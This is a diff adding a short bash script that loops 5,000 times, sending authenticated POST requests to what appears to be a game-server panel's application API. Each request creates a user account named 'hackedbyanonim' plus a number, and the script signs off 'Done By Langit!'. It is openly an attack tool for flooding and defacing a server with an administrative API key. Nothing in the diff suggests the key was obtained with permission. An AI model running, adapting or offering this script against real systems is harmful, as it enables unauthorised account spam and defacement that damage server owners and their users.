@@ -1,0 +1,15 @@
+API_KEY="ptla_"
+
+for i in {1..5000}; do
+  curl -s -X POST "https://domain/api/application/users" \
+    -H "Authorization: Bearer $API_KEY" \
+    -H "Content-Type: application/json" \
+    -d "{\"email\":\"anonim$i@gmail.com\",\"username\":\"hackedbyanonim$i\",\"first_name\":\"Anonim$i\",\"last_name\":\"Hacker\"}" \
+    --max-time 3 2>/dev/null | grep -q '"id"' && echo "Created hackedbyanonim$i"
+  
+  if [ $((i % 100)) -eq 0 ]; then
+    echo "Progress: $i users created"
+  fi
+done
+
+echo "Done By Langit!"
